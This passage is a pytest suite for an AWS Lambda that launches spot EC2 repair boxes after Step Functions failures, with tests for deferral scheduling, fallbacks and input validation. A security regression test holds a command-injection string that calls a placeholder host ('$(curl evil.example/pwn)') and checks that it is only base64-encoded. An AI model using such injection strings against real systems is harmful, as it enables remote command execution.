"""Unit tests for the synchronous SF-failure -> sf-watch-spot dispatcher.

Hermetic: ``nousergon_lib.ec2_spot`` and ``boto3`` are stubbed in sys.modules
BEFORE importing index (mirrors ci-watch-dispatcher/test_handler.py — index.py
itself imports the REAL nousergon_lib.spot_dispatch, which resolves its own
`from nousergon_lib import ec2_spot` / `import boto3` against these stubs).
Validates: a valid event launches a spot box and fires an async SSM command;
the on-demand fallback on spot capacity exhaustion; a total launch failure
(spot AND on-demand exhausted) returns a clean launched:false rather than
raising; the (cadence_slug, pipeline_name, run_date)-scoped concurrency lock
DEFERS (not drops) via a one-shot EventBridge Scheduler re-invoke, with a
loud generation cap, ConflictException-as-already-deferred, and a clean
defer_schedule_failed on Scheduler API errors (config#2226); a deferred
invocation re-evaluates via ListExecutions (recovered / retarget-newest-
failed / defer-again / fail-safe-launch); the empty-watch_log_key synthesis
fallback; a post-launch SSM-send failure terminates the box and returns
launched:false; a malformed event returns launched:false rather than
raising; the kill-switch short-circuit; the cause-field base64
command-injection guard; and the config#2267 launch-path hardening — a
failed concurrency probe launches WITH dedupe_degraded:true recorded
(site 1), and the load-bearing discriminator tags ride the RunInstances
launch call ATOMICALLY via extra_tags (site 2 root fix, config#2292) — the
PR758 post-launch create_tags bounded-retry/terminate path is gone entirely.
"""

from __future__ import annotations

import base64
import importlib
import json
import os
import re
import sys
import types

import pytest

sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))


# ── Stub nousergon_lib.ec2_spot + boto3 before importing index ─────────────────
class _SpotLaunchError(Exception):
    pass


class _SpotCapacityExhausted(_SpotLaunchError):
    pass


class _SpotQuotaExceededError(_SpotLaunchError):
    """config#2698 — account-wide spot quota (e.g. MaxSpotInstanceCountExceeded),
    distinct from ordinary per-pool capacity exhaustion."""


def _install_stubs(launch_impl, boto_clients):
    ec2_spot_mod = types.ModuleType("nousergon_lib.ec2_spot")
    ec2_spot_mod.SpotLaunchError = _SpotLaunchError
    ec2_spot_mod.SpotCapacityExhausted = _SpotCapacityExhausted
    ec2_spot_mod.SpotQuotaExceededError = _SpotQuotaExceededError
    ec2_spot_mod.launch = launch_impl
    sys.modules["nousergon_lib.ec2_spot"] = ec2_spot_mod

    boto3_mod = types.ModuleType("boto3")
    boto3_mod.client = lambda name, **kw: boto_clients[name]
    sys.modules["boto3"] = boto3_mod


class _FakeWaiter:
    def wait(self, **kw):
        return None


class _FakeEc2:
    def __init__(self, running_instances=None):
        self.terminated = []
        # {(cadence_slug, pipeline_name, run_date) -> [instance_ids]} already
        # "live" for the concurrency guard's describe_instances check to find.
        self._running_instances = dict(running_instances or {})

    def get_waiter(self, name):
        return _FakeWaiter()

    def terminate_instances(self, InstanceIds):  # noqa: N803 — boto3 kwarg name
        self.terminated.extend(InstanceIds)
        return {"TerminatingInstances": [{"InstanceId": i} for i in InstanceIds]}

    def describe_instances(self, Filters):  # noqa: N803 — boto3 kwarg name
        by_name = {f["Name"]: f["Values"] for f in Filters}
        cadence = by_name.get("tag:sf-watch-cadence", [None])[0]
        pipeline = by_name.get("tag:sf-watch-pipeline", [None])[0]
        run_date = by_name.get("tag:sf-watch-run-date", [None])[0]
        ids = self._running_instances.get((cadence, pipeline, run_date), [])
        return {"Reservations": [{"Instances": [{"InstanceId": i} for i in ids]}]} if ids else {"Reservations": []}


class _FakeSsm:
    def __init__(self):
        self.sent = []

    def describe_instance_information(self, **kw):
        return {"InstanceInformationList": [{"PingStatus": "Online"}]}

    def send_command(self, **kw):
        self.sent.append(kw)
        return {"Command": {"CommandId": "cmd-123"}}


class ConflictException(Exception):
    """Name-matched stand-in for scheduler.exceptions.ConflictException —
    index._is_scheduler_conflict matches on the exception CLASS NAME (the
    real boto3 factory-built class carries the same name)."""


class _FakeScheduler:
    def __init__(self, create_error=None):
        self.created = []
        self.create_error = create_error

    def create_schedule(self, **kw):
        if self.create_error is not None:
            raise self.create_error
        self.created.append(kw)
        return {
            "ScheduleArn": f"arn:aws:scheduler:us-east-1:711398986525:schedule/default/{kw['Name']}"
        }


class _FakeSfn:
    def __init__(self, executions=None, error=None):
        self.calls = []
        # newest-first, mirroring the real ListExecutions ordering.
        self.executions = list(executions or [])
        self.error = error

    def list_executions(self, **kw):
        self.calls.append(kw)
        if self.error is not None:
            raise self.error
        return {"executions": self.executions}


class _FakeContext:
    """Minimal Lambda context — index reads only invoked_function_arn (for
    the defer schedule's self-target + account-derived scheduler role ARN)."""
    invoked_function_arn = (
        "arn:aws:lambda:us-east-1:711398986525:function:"
        "alpha-engine-sf-watch-spot-dispatcher"
    )


def _load(monkeypatch, *, launch_impl=None, env=None, running_instances=None,
          scheduler=None, sfn=None):
    for k, v in (env or {}).items():
        monkeypatch.setenv(k, v)
    ssm = _FakeSsm()
    ec2 = _FakeEc2(running_instances=running_instances)
    scheduler = scheduler if scheduler is not None else _FakeScheduler()
    sfn = sfn if sfn is not None else _FakeSfn()
    clients = {"ec2": ec2, "ssm": ssm, "scheduler": scheduler, "stepfunctions": sfn}
    if launch_impl is None:
        launch_impl = lambda types_, subnets, **kw: "i-stub"  # noqa: E731
    _install_stubs(launch_impl, clients)
    # Derive the stub requirement from index.py's live import graph and fail
    # loud on drift here, rather than as a ModuleNotFoundError at deploy time
    # (config#1746 pattern — see ci-watch-dispatcher/test_handler.py).
    from _shared.hermetic_import_guard import assert_hermetic_imports_satisfied

    assert_hermetic_imports_satisfied(__file__)
    # nousergon_lib.spot_dispatch (config#2106) sits between index.py and the
    # stubbed nousergon_lib.ec2_spot/boto3 above. Its own `from nousergon_lib
    # import ec2_spot` / `import boto3` bindings are resolved once at ITS
    # import time — reload it in place (never a bare del+reimport — see
    # reference_pytest_del_reimport_vs_reload_fixture_corruption_260709) so
    # every test sees the CURRENT stub.
    if "nousergon_lib.spot_dispatch" in sys.modules:
        importlib.reload(sys.modules["nousergon_lib.spot_dispatch"])
    else:
        import nousergon_lib.spot_dispatch  # noqa: F401 — first import picks up the current stub

    # SpotProbeError back-fill (config#2267 site 1): index.py imports it and
    # its requirements pin nousergon-lib v0.106.0 (the first version carrying
    # it), but a local/shared environment may still have an OLDER installed
    # lib. Inject a name-compatible stand-in so the suite runs under both —
    # under >= 0.106.0 the real class is present and this is a no-op. (Reload
    # above re-executes the module, so re-check every _load call.)
    _sd = sys.modules["nousergon_lib.spot_dispatch"]
    if not hasattr(_sd, "SpotProbeError"):
        _sd.SpotProbeError = type("SpotProbeError", (Exception,), {})

    import index

    importlib.reload(index)
    index._test_ssm = ssm  # expose for assertions
    index._test_ec2 = ec2
    index._test_scheduler = scheduler
    index._test_sfn = sfn
    return index


def _event(**overrides):
    base = {
        "pipeline_name": "ne-weekly-freshness-pipeline",
        "cadence_slug": "saturday",
        "state_machine_arn": "arn:aws:states:us-east-1:711398986525:stateMachine:ne-weekly-freshness-pipeline",
        "execution_arn": "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:run-1",
        "run_date": "2026-07-11",
        "failed_state": "RationaleClustering",
        "cause": "States.Timeout",
        "watch_log_key": "consolidated/saturday_sf_watch/2026-07-11.json",
        "is_preflight": "false",
    }
    base.update(overrides)
    return base


def test_valid_event_launches_spot_and_sends_async_ssm(monkeypatch):
    calls = {}

    def _launch(types_, subnets, **kw):
        calls["spot"] = kw.get("spot")
        calls["profile"] = kw.get("iam_instance_profile")
        calls["tag_name"] = kw.get("tag_name")
        calls["extra_tags"] = kw.get("extra_tags")
        return "i-abc"

    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is True
    assert out["reason"] == "launched"
    assert out["instance_id"] == "i-abc"
    assert out["market"] == "spot"
    assert out["command_id"] == "cmd-123"
    assert out["pipeline_name"] == "ne-weekly-freshness-pipeline"
    assert out["cadence_slug"] == "saturday"
    assert out["run_date"] == "2026-07-11"
    assert calls["spot"] is True
    assert calls["profile"] == "alpha-engine-sf-watch-executor-profile"
    assert calls["tag_name"] == "alpha-engine-sf-watch-spot"
    # config#2292 root fix: the cadence/pipeline/run_date discriminator tags
    # ride the SAME RunInstances call as the launch itself (extra_tags), not
    # a separate post-launch create_tags call — used by both the concurrency
    # guard AND the fleet spot-orphan-reaper's completion check.
    assert calls["extra_tags"] == {
        "sf-watch-cadence": "saturday",
        "sf-watch-pipeline": "ne-weekly-freshness-pipeline",
        "sf-watch-run-date": "2026-07-11",
    }
    assert idx._test_ec2.terminated == []
    sent = idx._test_ssm.sent[0]
    cmd = sent["Parameters"]["commands"][0]
    # sf_watch_spot_bootstrap.sh (alpha-engine-config) takes its SF fields as
    # CLI FLAGS, not env vars.
    assert "exec bash infrastructure/sf_watch_spot_bootstrap.sh" in cmd
    assert '--pipeline "ne-weekly-freshness-pipeline"' in cmd
    assert '--cadence-slug "saturday"' in cmd
    assert '--execution-arn "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:run-1"' in cmd
    assert '--run-date "2026-07-11"' in cmd
    assert '--failed-state "RationaleClustering"' in cmd
    assert '--watch-log-key "consolidated/saturday_sf_watch/2026-07-11.json"' in cmd
    assert '--is-preflight "false"' in cmd
    assert "export HOME=/root" in cmd
    # cause is base64-encoded, never raw, in the constructed shell command.
    expected_b64 = base64.b64encode(b"States.Timeout").decode("ascii")
    assert f'--cause-b64 "{expected_b64}"' in cmd
    assert "States.Timeout" not in cmd
    # run_token is NOT threaded into the box (no in-box consumer — the
    # completion marker keys directly on cadence/pipeline/run_date) — only a
    # Lambda-side correlation id, surfaced via the SSM Comment field instead.
    assert "run_token" not in cmd
    assert "token" in sent["Comment"]

    assert sent["Parameters"]["executionTimeout"] == [str(idx.MAX_RUNTIME_SECONDS)]


def test_cause_with_shell_metacharacters_is_safely_base64_encoded(monkeypatch):
    """Security regression guard: a `cause` string containing quotes/`$`/
    backticks must NEVER be interpolated raw into the constructed SSM shell
    command — only its base64 encoding may appear."""
    dangerous_cause = '$(curl evil.example/pwn); `whoami`; "quoted"; \' single \''
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(cause=dangerous_cause), None)
    assert out["launched"] is True
    cmd = idx._test_ssm.sent[0]["Parameters"]["commands"][0]
    assert dangerous_cause not in cmd
    assert "curl evil.example" not in cmd
    assert "whoami" not in cmd
    expected_b64 = base64.b64encode(dangerous_cause.encode("utf-8")).decode("ascii")
    assert f'--cause-b64 "{expected_b64}"' in cmd


def test_on_demand_fallback_on_spot_capacity_exhaustion(monkeypatch):
    seen = []

    def _launch(types_, subnets, **kw):
        seen.append(kw.get("spot"))
        if kw.get("spot"):
            raise _SpotCapacityExhausted("no capacity in any pool")
        return "i-ondemand"

    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is True
    assert out["market"] == "on-demand"
    assert out["instance_id"] == "i-ondemand"
    assert seen == [True, False]  # tried spot, then on-demand


def test_total_launch_exhaustion_returns_clean_false_not_raise(monkeypatch):
    # SYNCHRONOUS contract (index.py docstring): spot AND on-demand both
    # exhausted must be a clean return, not an exception — the GHA caller
    # needs a JSON verdict to branch on.
    def _launch(types_, subnets, **kw):
        raise _SpotCapacityExhausted("exhausted everywhere")

    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "launch_failed"
    assert "exhausted everywhere" in out["error"]
    assert idx._test_ssm.sent == []


def test_non_capacity_launch_error_returns_clean_false(monkeypatch):
    def _launch(types_, subnets, **kw):
        raise _SpotLaunchError("RunInstances denied")

    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "launch_failed"


def test_concurrent_skip_now_defers_via_one_shot_schedule(monkeypatch):
    # config#2226 — DEFER, NOT DROP: a live box for the same full key no
    # longer drops the second failure; it schedules a one-shot EventBridge
    # Scheduler re-invoke of this same Lambda ~10min out.
    launched = []

    def _launch(types_, subnets, **kw):
        launched.append(True)
        return "i-new"

    idx = _load(
        monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        running_instances={
            ("saturday", "ne-weekly-freshness-pipeline", "2026-07-11"): ["i-already-running"],
        },
    )
    out = idx.handler(_event(), _FakeContext())
    assert out["launched"] is False
    assert out["reason"] == "deferred"
    assert out["defer_generation"] == 1
    assert out["existing_instance_ids"] == ["i-already-running"]
    assert launched == []  # never even attempted a spot launch — zero spend

    (sched,) = idx._test_scheduler.created
    assert sched["Name"] == out["schedule_name"]
    # Deterministic name: readable form when <=64 chars, sha256-digest form
    # otherwise (this key's readable form is 66 chars — over the AWS cap).
    assert sched["Name"] == idx._defer_schedule_name(
        "saturday", "ne-weekly-freshness-pipeline", "2026-07-11", 1
    )
    assert sched["Name"].startswith("sf-watch-defer-")  # IAM policy prefix scope
    assert sched["Name"].endswith("-g1")
    assert len(sched["Name"]) <= 64
    assert sched["GroupName"] == "default"
    assert sched["FlexibleTimeWindow"] == {"Mode": "OFF"}
    assert sched["ActionAfterCompletion"] == "DELETE"  # one-shot self-delete
    assert re.fullmatch(r"at\(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\)",
                        sched["ScheduleExpression"])
    # Target: this same Lambda (unqualified), via the dedicated scheduler
    # role (derived from the context account when the env var is unset).
    assert sched["Target"]["Arn"] == _FakeContext.invoked_function_arn
    assert sched["Target"]["RoleArn"] == (
        "arn:aws:iam::711398986525:role/alpha-engine-sf-watch-defer-scheduler-role"
    )
    # Input: the ORIGINAL validated payload + the incremented generation.
    payload = json.loads(sched["Target"]["Input"])
    assert payload["defer_generation"] == 1
    for key, value in _event().items():
        assert payload[key] == value


def test_defer_schedule_name_deterministic_and_within_aws_cap(monkeypatch):
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    # eod/ne-postclose readable form is 62 chars — stays fully readable.
    assert idx._defer_schedule_name(
        "eod", "ne-postclose-trading-pipeline", "2026-07-11", 1
    ) == "sf-watch-defer-eod-ne-postclose-trading-pipeline-2026-07-11-g1"
    # saturday/ne-weekly readable form is 66 chars — over the AWS 64-char
    # Name cap, so it degrades to the deterministic sha256-digest form.
    saturday = idx._defer_schedule_name(
        "saturday", "ne-weekly-freshness-pipeline", "2026-07-11", 1)
    assert saturday != "sf-watch-defer-saturday-ne-weekly-freshness-pipeline-2026-07-11-g1"
    for cadence, pipeline in (
        ("saturday", "ne-weekly-freshness-pipeline"),
        ("weekday", "ne-preopen-trading-pipeline"),
        ("eod", "ne-postclose-trading-pipeline"),
    ):
        for gen in (1, 2, 3):
            name = idx._defer_schedule_name(cadence, pipeline, "2026-07-11", gen)
            assert len(name) <= 64, (cadence, pipeline, name)
            assert name.startswith("sf-watch-defer-")  # IAM prefix scope
            assert name.endswith(f"-g{gen}")
            # Deterministic — same inputs, same name (the idempotency lock).
            assert name == idx._defer_schedule_name(cadence, pipeline, "2026-07-11", gen)
    # Distinct keys never collide.
    names = {
        idx._defer_schedule_name(c, p, d, g)
        for c, p in (("saturday", "ne-weekly-freshness-pipeline"),
                     ("eod", "ne-postclose-trading-pipeline"))
        for d in ("2026-07-11", "2026-07-12") for g in (1, 2)
    }
    assert len(names) == 8


def test_defer_cap_exhausts_loudly_no_further_schedule(monkeypatch):
    # Incoming defer_generation >= 3 with the lock still held: do NOT
    # schedule again — return defer_exhausted (the GHA caller files a P1 on
    # any unexpected launched!=true reason).
    idx = _load(
        monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        running_instances={
            ("saturday", "ne-weekly-freshness-pipeline", "2026-07-11"): ["i-still-running"],
        },
        sfn=_FakeSfn(executions=[{
            "executionArn": "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:run-1",
            "status": "FAILED",
        }]),
    )
    out = idx.handler(_event(defer_generation=3), _FakeContext())
    assert out["launched"] is False
    assert out["reason"] == "defer_exhausted"
    assert out["defer_generation"] == 3
    assert idx._test_scheduler.created == []
    assert idx._test_ssm.sent == []


def test_deferred_invocation_latest_succeeded_returns_recovered(monkeypatch):
    launched = []
    idx = _load(
        monkeypatch,
        launch_impl=lambda types_, subnets, **kw: launched.append(True) or "i-new",  # noqa: E731
        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        sfn=_FakeSfn(executions=[
            {"executionArn": "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:run-2",
             "status": "SUCCEEDED"},
            {"executionArn": "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:run-1",
             "status": "FAILED"},
        ]),
    )
    out = idx.handler(_event(defer_generation=1), _FakeContext())
    assert out["launched"] is False
    assert out["reason"] == "recovered"
    assert out["latest_status"] == "SUCCEEDED"
    assert launched == []
    assert idx._test_scheduler.created == []
    # ListExecutions hit the event's state_machine_arn, unfiltered, capped at 5.
    (call,) = idx._test_sfn.calls
    assert call == {
        "stateMachineArn": "arn:aws:states:us-east-1:711398986525:stateMachine:ne-weekly-freshness-pipeline",
        "maxResults": 5,
    }


def test_deferred_invocation_latest_running_returns_recovered(monkeypatch):
    idx = _load(
        monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        sfn=_FakeSfn(executions=[
            {"executionArn": "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:run-2",
             "status": "RUNNING"},
        ]),
    )
    out = idx.handler(_event(defer_generation=2), _FakeContext())
    assert out["launched"] is False
    assert out["reason"] == "recovered"
    assert idx._test_ssm.sent == []


def test_deferred_invocation_latest_failed_launches_against_newest_execution_arn(monkeypatch):
    newest = ("arn:aws:states:us-east-1:711398986525:execution:"
              "ne-weekly-freshness-pipeline:run-9-newest-failure")
    idx = _load(
        monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        sfn=_FakeSfn(executions=[
            {"executionArn": newest, "status": "FAILED"},
            {"executionArn": "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:run-1",
             "status": "FAILED"},
        ]),
    )
    out = idx.handler(_event(defer_generation=1), _FakeContext())
    assert out["launched"] is True
    cmd = idx._test_ssm.sent[0]["Parameters"]["commands"][0]
    # The dispatch was RETARGETED at the newest failed execution — the
    # originally-reported run-1 may be stale by the time the defer fires.
    assert f'--execution-arn "{newest}"' in cmd
    assert 'run-1"' not in cmd


def test_deferred_invocation_derives_state_machine_arn_when_event_omits_it(monkeypatch):
    idx = _load(
        monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        sfn=_FakeSfn(executions=[
            {"executionArn": "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:run-2",
             "status": "SUCCEEDED"},
        ]),
    )
    out = idx.handler(_event(defer_generation=1, state_machine_arn=""), _FakeContext())
    assert out["reason"] == "recovered"
    # Derived from execution_arn: swap :execution: -> :stateMachine:, drop
    # the trailing execution-name segment.
    (call,) = idx._test_sfn.calls
    assert call["stateMachineArn"] == (
        "arn:aws:states:us-east-1:711398986525:stateMachine:ne-weekly-freshness-pipeline"
    )


def test_deferred_invocation_latest_failed_with_live_box_defers_next_generation(monkeypatch):
    idx = _load(
        monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        running_instances={
            ("saturday", "ne-weekly-freshness-pipeline", "2026-07-11"): ["i-still-running"],
        },
        sfn=_FakeSfn(executions=[
            {"executionArn": "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:run-2",
             "status": "TIMED_OUT"},
        ]),
    )
    out = idx.handler(_event(defer_generation=1), _FakeContext())
    assert out["launched"] is False
    assert out["reason"] == "deferred"
    assert out["defer_generation"] == 2
    (sched,) = idx._test_scheduler.created
    assert sched["Name"].endswith("-g2")
    payload = json.loads(sched["Target"]["Input"])
    assert payload["defer_generation"] == 2


def test_states_api_error_fails_safe_toward_launching(monkeypatch):
    # Mirrors the concurrency check's posture: a broken re-check must never
    # block the repair dispatch.
    idx = _load(
        monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        sfn=_FakeSfn(error=RuntimeError("States API hiccup")),
    )
    out = idx.handler(_event(defer_generation=1), _FakeContext())
    assert out["launched"] is True


def test_conflict_exception_treated_as_already_deferred(monkeypatch):
    idx = _load(
        monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        running_instances={
            ("saturday", "ne-weekly-freshness-pipeline", "2026-07-11"): ["i-already-running"],
        },
        scheduler=_FakeScheduler(create_error=ConflictException("schedule exists")),
    )
    out = idx.handler(_event(), _FakeContext())
    # Clean return, never a raise: an earlier defer for the same
    # (key, generation) already covers this failure.
    assert out["launched"] is False
    assert out["reason"] == "deferred"
    assert out["already_scheduled"] is True
    assert out["defer_generation"] == 1


def test_scheduler_api_error_returns_defer_schedule_failed(monkeypatch):
    idx = _load(
        monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        running_instances={
            ("saturday", "ne-weekly-freshness-pipeline", "2026-07-11"): ["i-already-running"],
        },
        scheduler=_FakeScheduler(create_error=RuntimeError("Scheduler API down")),
    )
    out = idx.handler(_event(), _FakeContext())
    # SYNCHRONOUS contract holds even when the defer path itself breaks.
    assert out["launched"] is False
    assert out["reason"] == "defer_schedule_failed"
    assert "Scheduler API down" in out["error"]


def test_defer_role_arn_env_override_wins(monkeypatch):
    idx = _load(
        monkeypatch,
        env={"SF_WATCH_DISPATCH_ENABLED": "true",
             "SF_WATCH_DEFER_ROLE_ARN": "arn:aws:iam::711398986525:role/custom-defer-role"},
        running_instances={
            ("saturday", "ne-weekly-freshness-pipeline", "2026-07-11"): ["i-already-running"],
        },
    )
    out = idx.handler(_event(), _FakeContext())
    assert out["reason"] == "deferred"
    (sched,) = idx._test_scheduler.created
    assert sched["Target"]["RoleArn"] == "arn:aws:iam::711398986525:role/custom-defer-role"


def test_empty_watch_log_key_is_synthesized_from_pipeline_prefix(monkeypatch):
    # Operator-refire fallback: the canonical key is minted only by
    # saturday-sf-watch-dispatcher; a hand-fired event with an empty
    # watch_log_key gets the same {prefix}/{run_date}.json synthesized.
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(watch_log_key=""), _FakeContext())
    assert out["launched"] is True
    cmd = idx._test_ssm.sent[0]["Parameters"]["commands"][0]
    assert '--watch-log-key "consolidated/saturday_sf_watch/2026-07-11.json"' in cmd


def test_empty_watch_log_key_unknown_pipeline_dispatches_without_key(monkeypatch):
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(
        _event(
            pipeline_name="some-future-pipeline",
            watch_log_key="",
            execution_arn="arn:aws:states:us-east-1:711398986525:execution:some-future-pipeline:run-1",
            state_machine_arn="arn:aws:states:us-east-1:711398986525:stateMachine:some-future-pipeline",
        ),
        _FakeContext(),
    )
    # watch_log_key is optional in the box contract — unknown pipeline still
    # dispatches, with the flag empty.
    assert out["launched"] is True
    cmd = idx._test_ssm.sent[0]["Parameters"]["commands"][0]
    assert '--watch-log-key ""' in cmd


def test_malformed_defer_generation_returns_clean_false(monkeypatch):
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(defer_generation="not-a-number"), _FakeContext())
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"
    assert idx._test_ssm.sent == []


def test_different_run_date_same_pipeline_cadence_is_not_blocked(monkeypatch):
    # This is the whole point of the full (cadence, pipeline, run_date)
    # granularity — a partial-key lock would wrongly starve a second
    # independent failure for a different run_date.
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-new",  # noqa: E731
        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        running_instances={
            ("saturday", "ne-weekly-freshness-pipeline", "2026-07-04"): ["i-other-date"],
        },
    )
    out = idx.handler(_event(run_date="2026-07-11"), None)
    assert out["launched"] is True
    assert out["instance_id"] == "i-new"


def test_different_pipeline_same_cadence_and_date_is_not_blocked(monkeypatch):
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-new",  # noqa: E731
        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
        running_instances={
            ("saturday", "ne-preopen-trading-pipeline", "2026-07-11"): ["i-other-pipeline"],
        },
    )
    out = idx.handler(_event(), None)
    assert out["launched"] is True


def test_concurrency_check_failure_still_launches(monkeypatch):
    # config#2267 site 1 POLICY: a broken probe must never block a launch —
    # coverage beats dedupe. (Under nousergon-lib >= 0.106.0 the raw
    # describe_instances error surfaces as SpotProbeError and the launch is
    # flagged dedupe_degraded; under the old fail-open lib it degrades to []
    # silently. Either way the box launches — the explicit degraded-flag
    # contract is pinned separately below.)
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-new",  # noqa: E731
        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
    )

    def _boom(Filters):  # noqa: N803 — boto3 kwarg name
        raise RuntimeError("EC2 API hiccup")

    idx._test_ec2.describe_instances = _boom
    out = idx.handler(_event(), None)
    assert out["launched"] is True


def test_probe_failure_launches_with_dedupe_degraded_recorded(monkeypatch):
    """config#2267 site 1: SpotProbeError from the concurrency probe →
    proceed to launch, with dedupe_degraded:true + the probe error recorded
    in the returned verdict (lib-version-agnostic via a direct monkeypatch
    of the probe primitive)."""
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-degraded",  # noqa: E731
        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
    )

    def _probe_down(*args, **kwargs):
        raise idx.SpotProbeError("concurrency probe failed for tag_name='alpha-engine-sf-watch-spot': ThrottlingException: rate exceeded")

    monkeypatch.setattr(idx.spot_dispatch, "running_instance_ids", _probe_down)
    out = idx.handler(_event(), None)
    assert out["launched"] is True
    assert out["dedupe_degraded"] is True
    # The verdict names the probe error — the GHA caller archives it.
    assert "ThrottlingException" in out["dedupe_probe_error"]
    # A healthy probe keeps the flag False.
    idx2 = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out2 = idx2.handler(_event(), None)
    assert out2["launched"] is True
    assert out2["dedupe_degraded"] is False
    assert "dedupe_probe_error" not in out2


def test_discriminator_tags_ride_the_launch_call_not_a_separate_create_tags(monkeypatch):
    """config#2292 root fix for config#2267 site 2: the (cadence, pipeline,
    run_date) discriminator tags are passed to
    spot_dispatch.launch_with_fallback as extra_tags — merged into
    krepis.ec2_spot.launch's RunInstances TagSpecifications — so there is no
    separate post-launch create_tags call left to retry or fail. A launch
    that succeeds is a fully-tagged launch, unconditionally; no
    ec2.create_tags call happens at all."""
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-atomic",  # noqa: E731
        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
    )
    out = idx.handler(_event(), None)
    assert out["launched"] is True
    assert out["instance_id"] == "i-atomic"
    assert idx._test_ec2.terminated == []
    assert not hasattr(idx._test_ec2, "create_tags_attempts")


def test_post_launch_ssm_failure_terminates_instance_returns_clean_false(monkeypatch):
    idx = _load(
        monkeypatch,
        launch_impl=lambda types_, subnets, **kw: "i-orphan",  # noqa: E731
        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
    )

    def _boom_send(**kw):
        raise RuntimeError("SSM SendCommand failed")

    idx._test_ssm.send_command = _boom_send
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "post_launch_failed"
    assert out["instance_id"] == "i-orphan"
    # The just-launched box was terminated (not orphaned), and the handler
    # still returned a clean result instead of raising.
    assert idx._test_ec2.terminated == ["i-orphan"]


def test_malformed_run_date_returns_clean_false_not_raise(monkeypatch):
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(run_date="not-a-date"), None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"
    assert idx._test_ssm.sent == []


def test_malformed_execution_arn_returns_clean_false(monkeypatch):
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(execution_arn="not-an-arn"), None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"


def test_missing_pipeline_name_returns_clean_false(monkeypatch):
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    event = _event()
    del event["pipeline_name"]
    out = idx.handler(event, None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"


def test_missing_optional_fields_still_launches(monkeypatch):
    # failed_state/cause/watch_log_key/state_machine_arn/is_preflight are all
    # optional — only pipeline_name/cadence_slug/execution_arn/run_date are
    # required (mirrors sf_watch_spot_bootstrap.sh's own FATAL check).
    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
    event = _event()
    for optional in ("state_machine_arn", "failed_state", "cause", "watch_log_key", "is_preflight"):
        del event[optional]
    out = idx.handler(event, None)
    assert out["launched"] is True


# ── config#2270: force_on_demand relaunch (mid-run spot-reclaim coverage) ────


def test_force_on_demand_threads_through_to_launch(monkeypatch):
    """The reclaim checker's relaunch payload carries force_on_demand:"true" —
    launch_with_fallback (nousergon-lib v0.106.0) must go STRAIGHT to
    on-demand, never trying spot first."""
    seen = []

    def _launch(types_, subnets, **kw):
        seen.append(kw.get("spot"))
        return "i-ondemand-relaunch"

    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
